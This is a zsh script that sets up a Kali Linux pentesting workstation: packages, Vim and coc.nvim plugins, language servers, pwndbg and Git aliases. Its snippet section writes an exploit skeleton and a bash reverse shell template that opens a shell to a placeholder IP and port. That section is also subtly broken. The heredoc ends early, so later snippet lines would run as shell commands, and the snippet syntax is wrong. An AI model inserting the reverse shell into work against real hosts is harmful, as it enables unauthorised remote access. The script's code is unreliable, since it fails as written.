#!/usr/bin/env zsh
# ============================================================================
# Kali Linux Vim + Pentesting Workstation Setup
# Run: chmod +x setup-kali-vim.sh && ./setup-kali-vim.sh
# ============================================================================

set -euo pipefail

CYAN='\033[0;36m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

info()  { echo -e "${CYAN}[+]${NC} $1"; }
ok()    { echo -e "${GREEN}[✓]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }

echo ""
echo -e "${CYAN}============================================${NC}"
echo -e "${CYAN}  Kali Linux Vim Pentester Workstation Setup${NC}"
echo -e "${CYAN}============================================${NC}"
echo ""

# ============================================================================
# 1. System Packages
# ============================================================================
info "Installing system packages..."

sudo apt-get update -y
sudo apt-get install -y \
  vim vim-gtk3 \
  git curl wget \
  build-essential cmake pkg-config \
  python3 python3-pip python3-venv \
  nodejs npm \
  clangd clang-tidy lldb \
  shellcheck shfmt \
  gdb gdb-multiarch \
  strace ltrace \
  xxd \
  xclip xsel \
  ripgrep fd-find \
  fzf \
  bat \
  eza \
  jq \
  tmux \
  universal-ctags

ok "System packages installed"

# ============================================================================
# 2. CLI Tool Upgrades
# ============================================================================
info "Installing/upgrading CLI tools..."

# bat → batcat on Debian; symlink for convenience
if ! command -v bat &>/dev/null && command -v batcat &>/dev/null; then
  mkdir -p ~/.local/bin
  ln -sf "$(command -v batcat)" ~/.local/bin/bat
fi

# fd → fdfind on Debian
if ! command -v fd &>/dev/null && command -v fdfind &>/dev/null; then
  mkdir -p ~/.local/bin
  ln -sf "$(command -v fdfind)" ~/.local/bin/fd
fi

# Update npm-based tools
sudo npm install -g prettier eslint typescript

ok "CLI tools ready"

# ============================================================================
# 3. Vim Directory Structure
# ============================================================================
info "Creating Vim directories..."

mkdir -p ~/.vim/{autoload,plugged,undodir,sessions,UltiSnips}
mkdir -p ~/.cache/tags

ok "Vim directories created"

# ============================================================================
# 4. vim-plug (if not present)
# ============================================================================
if [ ! -f ~/.vim/autoload/plug.vim ]; then
  info "Installing vim-plug..."
  curl -fsLo ~/.vim/autoload/plug.vim --create-dirs \
    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
  ok "vim-plug installed"
else
  ok "vim-plug already installed"
fi

# ============================================================================
# 5. coc.nvim extensions (via Node)
# ============================================================================
info "Installing coc.nvim language server extensions..."

# Extensions are auto-installed by coc on first Vim launch via g:coc_global_extensions
# Pre-warm the cache by installing them now
COC_EXT_DIR="${XDG_CONFIG_HOME:-$HOME/.config}/coc/extensions"
mkdir -p "$COC_EXT_DIR"

# Use the extensions listed in .vimrc
cd "$COC_EXT_DIR"
npm install \
  coc-json \
  coc-yaml \
  coc-tsserver \
  coc-html \
  coc-css \
  coc-eslint \
  coc-prettier \
  coc-pyright \
  coc-go \
  coc-rust-analyzer \
  coc-clangd \
  coc-java \
  coc-sql \
  coc-sh \
  coc-git \
  coc-lists \
  coc-snippets \
  coc-marketplace 2>/dev/null || warn "Some coc extensions may have failed (non-critical)"

ok "coc.nvim extensions staged"

# ============================================================================
# 6. LSP backends
# ============================================================================
info "Setting up LSP backends..."

# Python
pip3 install --user ruff pyright 2>/dev/null || true

# Rust
if command -v rustup &>/dev/null; then
  rustup component add rust-analyzer rust-src clippy 2>/dev/null || true
fi

# Go
if command -v go &>/dev/null; then
  go install golang.org/x/tools/gopls@latest 2>/dev/null || true
  go install github.com/nametake/golangci-lint-langserver@latest 2>/dev/null || true
fi

# Bash
if command -v npm &>/dev/null; then
  sudo npm install -g bash-language-server 2>/dev/null || true
fi

ok "LSP backends configured"

# ============================================================================
# 7. pwndbg (GDB plugin for exploit dev)
# ============================================================================
if [ ! -d ~/.pwndbg ]; then
  info "Installing pwndbg..."
  git clone --depth=1 https://github.com/pwndbg/pwndbg ~/.pwndbg
  cd ~/.pwndbg && ./setup.sh 2>/dev/null || warn "pwndbg setup incomplete — run manually"
  ok "pwndbg installed"
fi

# ============================================================================
# 8. UltiSnips snippets
# ============================================================================
if [ ! -f ~/.vim/UltiSnips/all.snippets ]; then
  info "Creating default snippets..."
  cat > ~/.vim/UltiSnips/all.snippets << 'SNIP'
snippet shebang
	#!/usr/bin/env ${1:python3}
	${2}
SNIP

snippet exploit
	#!/usr/bin/env python3
	"""
	Exploit: ${1:name}
	Target:  ${2:host:port}
	Author:  ${3:you}
	"""
	import sys
	import struct
	import socket

	${4:payload}

	if __name__ == '__main__':
		${5:main()}
SNIP

snippet reverse-shell
	#!/usr/bin/env bash
	# Reverse Shell
	bash -i >& /dev/tcp/${1:IP}/${2:PORT} 0>&1
SNIP
  ok "Snippets created"
fi

# ============================================================================
# 9. Git config for pentesting
# ============================================================================
info "Configuring Git..."

git config --global user.name 2>/dev/null || git config --global user.name "Pentester"
git config --global user.email 2>/dev/null || git config --global user.email "pentester@kali"
git config --global core.editor "vim"
git config --global core.autocrlf input
git config --global core.safecrlf warn
git config --global push.default current
git config --global pull.rebase true
git config --global rebase.autoStash true
git config --global init.defaultBranch main
git config --global alias.st status
git config --global alias.co checkout
git config --global alias.br branch
git config --global alias.ci commit
git config --global alias.di diff
git config --global alias.lg "log --oneline --graph --all -30"
git config --global alias.last "log -1 --stat"
git config --global alias.unstage "reset HEAD --"
git config --global alias.amend "commit --amend --no-edit"
git config --global alias.undo "reset --soft HEAD~1"
git config --global alias.ap "add -p"
git config --global alias.fixup "commit --fixup"
git config --global alias.squash "commit --squash"
git config --global alias.cleanup "!git branch --merged | grep -v '\\*\\|main\\|master' | xargs -r git branch -d"
git config --global diff.compactionHeuristic true
git config --global diff.indentHeuristic on

ok "Git configured"

# ============================================================================
# 10. Final check
# ============================================================================
echo ""
echo -e "${GREEN}============================================${NC}"
echo -e "${GREEN}  Setup Complete!${NC}"
echo -e "${GREEN}============================================${NC}"
echo ""
echo "  Next steps:"
echo "    1. Launch Vim and run:  :PlugInstall"
echo "    2. Restart Vim to let coc install extensions"
echo "    3. In Vim, run:         :CocInfo  (verify LSP status)"
echo "    4. Source .vimrc:       :source \$MYVIMRC"
echo ""
echo "  Check cheat sheet:    cat ~/vim-pentest-cheatsheet.md"
echo "  View workflow guide:  cat ~/vim-pentest-workflow.md"
echo ""

# Prompt for PlugInstall
read -q "REPLY?Launch Vim to install plugins now? (y/n) "
echo ""
if [[ "$REPLY" =~ ^[Yy]$ ]]; then
  vim +PlugInstall +qall
fi
